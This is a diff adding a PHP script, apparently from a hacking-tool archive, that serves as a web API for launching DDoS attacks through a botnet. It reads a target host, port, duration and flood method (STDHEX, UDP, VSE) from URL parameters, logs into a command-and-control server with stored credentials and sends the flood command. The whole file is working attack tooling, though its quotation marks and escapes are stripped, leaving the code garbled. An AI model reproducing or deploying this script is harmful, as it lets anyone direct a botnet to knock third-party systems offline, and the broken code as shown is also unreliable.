@@ -1,0 +1,42 @@
+php
+API Link httpServerIPAPI.php&host=$host&port=$port&time=$time&type=$method
+ DOWNLOADED BY B4CKDOOR - B4CKDOORARCHIVE.CLUB
+set_time_limit(0);
+
+$server = serverip;
+$conport = cncport;
+$username = Username;
+$password = Password;
+
+$activekeys = array();
+
+$method = $_GET['type'];
+$target = $_GET['host'];
+$port = $_GET['port'];
+$time = $_GET['time'];
+
+if($method == STDHEX){$command = ! STDHEX $target $port $time;}
+if($method == UDP){$command = ! UDP $target $port $time 32 65500 10;}
+if($method == VSE){$command = ! VSE $target $port $time 32 1024 10;}
+
+
+$sock = fsockopen($server, $conport, $errno, $errstr, 2);
+
+if(!$sock){
+        echo Couldn't Connect To CNC Server...;
+} else{
+        print(fread($sock, 512).n);
+        fwrite($sock, $username . n);
+        echo br;
+        print(fread($sock, 512).n);
+        fwrite($sock, $password . n);
+        echo br;
+        if(fread($sock, 512)){
+                print(fread($sock, 512).n);
+        }
+
+        fwrite($sock, $command . n);
+        fclose($sock);
+        echo br;
+        echo  $command ;
+}
